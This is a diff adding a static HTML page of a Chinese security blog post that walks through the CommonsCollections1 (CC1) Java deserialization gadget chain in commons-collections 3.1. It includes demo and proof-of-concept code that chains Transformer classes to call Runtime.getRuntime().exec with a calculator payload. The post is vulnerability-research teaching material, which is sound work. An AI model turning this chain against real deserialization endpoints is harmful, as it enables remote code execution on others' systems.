@@ -1,0 +1,378 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>CC1链 | pyroxenite</title>
+<meta name="description" content="温故而知新">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://pyroxenites.github.io/favicon.ico?v=1685337865502">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://pyroxenites.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://pyroxenites.github.io">
+        <img class="avatar" src="https://pyroxenites.github.io/images/avatar.png?v=1685337865502" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://pyroxenites.github.io">
+        <h1 class="site-title">pyroxenite</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">CC1链</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2022-03-28</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://pyroxenites.github.io/tag/T5QnKuhLq/">
+                    漏洞研究
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content" v-pre>
+            <h1 id="commoncollections1">CommonCollections1</h1>
+<figure data-type="image" tabindex="1"><img src="https://pyroxenites.github.io/post-images/1648690004041-ffb3ff13-b274-4fe9-9c48-1a75724b8916.png" alt="image.png" loading="lazy"></figure>
+<h2 id="简介">简介</h2>
+<p>Apache Commons Collections是一个第三方的基础类库，提供了很多强有力的数据结构类型并且实现了各种集合工具类，可以说是apache开源项目的重要组件。<br>
+CommonsCollections1，反序列化的第一种RCE序列化链<br>
+CommonsCollections1反序列化漏洞点仍然是commons-collections-3.1版本</p>
+<blockquote>
+<p>CC1有两个利用链,其一是下方解释那种,另外一种涉及动态代理</p>
+</blockquote>
+<h2 id="利用链">利用链</h2>
+<h2 id="依赖">依赖</h2>
+<pre><code class="language-xml">&lt;dependencies&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+            &lt;version&gt;3.1&lt;/version&gt;
+        &lt;/dependency&gt;
+ &lt;/dependencies&gt;
+</code></pre>
+<p>此实验Java版本，在Java 8u71以后的版本中修改了触发的类，所以不支持此链的利用,故选择jdk7<br>
+<img src="https://pyroxenites.github.io/post-images/1649208046562-fce0b411-73ca-4139-a27b-f610816a48c3.png" alt="image.png" loading="lazy"></p>
+<h2 id="前提知识">前提知识</h2>
+<blockquote>
+<p>我们分析CC1链之前,首先需要知道如下知识<br>
+他们组成了CC1链的利用方法</p>
+</blockquote>
+<h2 id="cc1-demo">CC1 Demo</h2>
+<blockquote>
+<p>首先看一下CC1的demo</p>
+</blockquote>
+<pre><code class="language-java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.util.HashMap;
+import java.util.Map;
+
+public class Main {
+    public static void main(String[] args) throws Exception {
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.getRuntime()),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class},
+                        new Object[]{&quot;calc&quot;}),
+        };
+        Transformer transformerChain = new
+                ChainedTransformer(transformers);
+        Map innerMap = new HashMap();
+        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+        outerMap.put(&quot;zeo&quot;, &quot;666&quot;);
+    }
+}
+
+</code></pre>
+<blockquote>
+<p>对其中的知识进行解释</p>
+</blockquote>
+<h3 id="transformer">Transformer</h3>
+<p>Transformer是⼀个接⼝，只有⼀个待实现的方法transform</p>
+<figure data-type="image" tabindex="2"><img src="https://pyroxenites.github.io/post-images/1649208069482-0c3d9b87-2948-4166-bf3f-3eecb917fbe6.png" alt="image.png" loading="lazy"></figure>
+<h3 id="constanttransformer">ConstantTransformer</h3>
+<figure data-type="image" tabindex="3"><img src="https://pyroxenites.github.io/post-images/1649209467809-4d670918-2db6-436c-87a7-cd28c66b3fa1.png" alt="image.png" loading="lazy"></figure>
+<ul>
+<li>ConstantTransformer是实现了Transformer接⼝的⼀个类
+<ul>
+<li>简单就是你输入什么类，它就返回什么</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-java">new ConstantTransformer(Runtime.getRuntime()),
+将getRuntime赋给iCOnstant之后,会通过tranform返回
+</code></pre>
+<p>触发的时候<br>
+<img src="https://pyroxenites.github.io/post-images/1649210888415-7e1af51f-b96c-470b-9541-42ac38d1d71b.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1649210911409-ad6af8d4-b7cd-4702-b9f3-fb0d28d597e8.png" alt="image.png" loading="lazy"><br>
+会调用ConstantTransformer.transform中,进行将Runtime.getRuntime()进行返回</p>
+<h3 id="invokertransformer">InvokerTransformer</h3>
+<ul>
+<li>这个类就是代码执行的关键了</li>
+<li>这个类的实现主要采用了反射的方法</li>
+<li>简单的说：可以通过这个类反射实例化调用其他类其他方法（任意的方法，也就是命令执行）</li>
+<li>只要参数可控，就是任意命令执行</li>
+<li>该类的构造方法中传入三个变量,分别是方法名,参数的类型,和参数</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://pyroxenites.github.io/post-images/1649209536095-43ef4cb6-0ac6-4ddf-9ae1-4684269820c3.png" alt="image.png" loading="lazy"></figure>
+<ul>
+<li>是实现Transformer接口的一个类</li>
+<li>又会在transform方法中利用反射的知识,执行了input对象的iMethodName</li>
+</ul>
+<blockquote>
+<p>InvokerTransformer的transform方法中利用了反射，通过反射调用我们传入的类中的方法，所以这类其实就是我们执行恶意命令的核心类</p>
+</blockquote>
+<pre><code class="language-java">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
+        this.iMethodName = methodName;
+        this.iParamTypes = paramTypes;
+        this.iArgs = args;
+    }
+public Object transform(Object input) {
+        if (input == null) {
+            return null;
+        } else {
+            try {
+                //进行反射调用
+                //那么如果可以控制输入的iMethodName，iParamTypes，iArgs，input就可以利用这个代码进行代码执行
+                Class cls = input.getClass();
+                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
+                return method.invoke(input, this.iArgs);
+            } catch (NoSuchMethodException var5) {
+                throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + this.iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' does not exist&quot;);
+            } catch (IllegalAccessException var6) {
+                throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + this.iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' cannot be accessed&quot;);
+            } catch (InvocationTargetException var7) {
+                throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + this.iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' threw an exception&quot;, var7);
+            }
+        }
+</code></pre>
+<p><img src="https://pyroxenites.github.io/post-images/1649211012651-18aa3a95-bd6e-4a3e-b447-4044a918c3f0.png" alt="image.png" loading="lazy"><br>
+触发器最后会进入到InvokerTransformer中进行反射执行命令<br>
+<img src="https://pyroxenites.github.io/post-images/1649211048793-39114dda-815b-4995-b334-68b324973a4a.png" alt="image.png" loading="lazy"></p>
+<h4 id="poc">POC</h4>
+<p>利用构造函数传入methodName，paramTypes，args 来确定我们调用的方法，参数类型以及参数</p>
+<pre><code class="language-java">String methodName = &quot;exec&quot;;
+Class[] paramTypes = new Class[]{String.class};
+Object[] arg = new Object[]{&quot;open -a Calculator&quot;}; // windows这里换成calc.exe即可
+</code></pre>
+<p><code>将实例传入transform方法，结合之前传入的methodName，paramTypes，args 可进行代码执行</code></p>
+<pre><code class="language-java">InvokerTransformer invokerTransformer = new InvokerTransformer(methodName,paramTypes,arg);  invokerTransformer.transform(Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;)));
+</code></pre>
+<h4 id="反射在此的理解">反射在此的理解</h4>
+<pre><code class="language-java">Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;)
+</code></pre>
+<h5 id="invoke">invoke</h5>
+<ol>
+<li>invoke调用普通方法时，传入的必须是实例化后的类</li>
+<li>invoke调用静态方法时，传入类即可</li>
+</ol>
+<pre><code>invoke(obj,params)
+</code></pre>
+<pre><code class="language-java">//这里利用invoke调用Runtime中的静态getRuntime方法
+private static Runtime currentRuntime = new Runtime();
+    public static Runtime getRuntime() {
+        return currentRuntime;
+}
+</code></pre>
+<h3 id=""></h3>
+<h3 id="chainedtransformer">ChainedTransformer</h3>
+<ul>
+<li>也是实现Transformer接口的一个类</li>
+<li>它就可以承接下一步的操作。</li>
+<li>它的主要作⽤：</li>
+<li>将内部的多个Transformer串在⼀起</li>
+<li>前⼀个回调返回的结果，作为后⼀个回调的参数传⼊</li>
+</ul>
+<blockquote>
+<p>ChainedTransformer类会在构造函数的时候接受 Transformer[] 数组，即列表中的所有元素都要实现 Transformer 接口<br>
+<img src="https://pyroxenites.github.io/post-images/1649209677448-00bcc261-e21b-4005-b834-c1a9091f87bd.png" alt="image.png" loading="lazy"><br>
+同时在transform方法中会对Transformer数组中的元素按照顺序调用transform方法，同时将上一个元素的返回对象作为输入传递给下一个元素的transform方法中</p>
+</blockquote>
+<figure data-type="image" tabindex="5"><img src="https://pyroxenites.github.io/post-images/1649208516180-c711edd7-8e7b-40ac-a11e-32070c61e5db.png" alt="" loading="lazy"></figure>
+<pre><code class="language-java">public class ChainedTransformer implements Transformer, Serializable {
+ 			.......
+}
+......
+  
+    //该方法首先有一个构造函数,将传入的Transformer类型的数组赋值给iTransformers,这里iTransformers是一个数组
+public ChainedTransformer(Transformer[] transformers) {
+        this.iTransformers = transformers;
+    }
+
+//它会将前一个transform返回的结果作为后一个对象的传参,假设我们传入的Transformer[]数组中有两个数据
+//new ConstantTransformer(Runtime.getRuntime())
+//new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class},new Object[{&quot;calc&quot;})
+public Object transform(Object object) {
+        for(int i = 0; i &lt; this.iTransformers.length; ++i) {
+            object = this.iTransformers[i].transform(object);
+        }
+
+        return object;
+}
+</code></pre>
+<p>触发器的时候,会进入到循环中去<br>
+<img src="https://pyroxenites.github.io/post-images/1649210721069-41120d0d-52fa-4297-bccd-c35d4486c013.png" alt="image.png" loading="lazy"></p>
+<h3 id="transformedmap">TransformedMap</h3>
+<p>一个触发器，主要是后面类中的实现类的Transformer()方法</p>
+<pre><code class="language-java">protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
+    super(map);
+    this.keyTransformer = keyTransformer;
+    this.valueTransformer = valueTransformer;
+}
+</code></pre>
+<ul>
+<li>它是基本的数据类型Map类的做⼀个修饰，被修饰过的Map在添加新的元素时，将可以执⾏⼀个函数。</li>
+<li>这个函数，就是⼀个实现了Transformer接⼝的类，这个类也就是链中导向下一环的入口。</li>
+<li>第一个参数，要绑定修饰的map，第三个参数就是 valueTransformer就是要执行的Transformer接⼝的类。</li>
+</ul>
+<pre><code class="language-java">Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+</code></pre>
+<blockquote>
+<p>decorate将我们ChainedTransformer传入到valueTransformer</p>
+</blockquote>
+<figure data-type="image" tabindex="6"><img src="https://pyroxenites.github.io/post-images/1649210057270-2815d3c2-9d6e-4d54-85b4-3bf30898bd0e.png" alt="image.png" loading="lazy"></figure>
+<pre><code class="language-java">outerMap.put(&quot;zeo&quot;, &quot;666&quot;);
+</code></pre>
+<p><img src="https://pyroxenites.github.io/post-images/1649210507965-81611015-8eb4-42bc-b524-b3b4cf53c593.png" alt="image.png" loading="lazy"><br>
+当我们发现往里面填充值得时候,会进入transformValue方法<br>
+调用valueTransformer(ChainedTransformer类的实例)的transform方法<br>
+<img src="https://pyroxenites.github.io/post-images/1649210554556-d95f8da9-4db4-4618-a447-ddba7d9c1bfa.png" alt="image.png" loading="lazy"></p>
+<p>第二次调用的时候调用Runtime对象就会将object进行传入<br>
+<img src="https://pyroxenites.github.io/post-images/1649210988772-6442ff30-ac06-4fd6-ac9b-235d36dea44c.png" alt="image.png" loading="lazy"></p>
+<h1 id="分析">分析</h1>
+<ol>
+<li>实例化<code>new Transformer</code>的数组,构造中间的小链子，ConstantTransformer和InvokerTransformer不是一个类,但都继承了Transformer,故可以放到Transformer[]接口中去</li>
+<li>小链子中有两个<code>ConstantTransformer，InvokerTransformer</code>，这两个构造好后,放入刚刚提到的<code>ChainedTransformer</code>类里面,他们就是连起来里面,<strong>也就是我们常用的Runtime.getRuntime().exec()</strong></li>
+</ol>
+<figure data-type="image" tabindex="7"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MjUxNjU4NTYucG5n?x-oss-process=image/format,png" alt="" loading="lazy"></figure>
+<ol start="3">
+<li>命令执行造好了，还有一个触发ChainedTransformer的方法，就是TransformedMap.decorate方法</li>
+<li>实例化一个map对象，然后修饰绑定上transformerChain这个上面，每当有map有新元素进来的时候，就会触发上面的链</li>
+<li>所以map对象put(“test”, “xxxx”)一下就会触发命令执行成功弹出了计算器</li>
+</ol>
+<h2 id="补充">补充</h2>
+<blockquote>
+<p>在反射当初static,对象为null,只有非静态,对象才是它本身</p>
+</blockquote>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://pyroxenites.github.io/post/yu-nei-xin-xi-shou-ji/">
+              <h3 class="post-title">
+                下一篇：域内信息收集
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">温故而知新</div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  Powered by pyroxenite | <a class="rss" href="https://pyroxenites.github.io/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
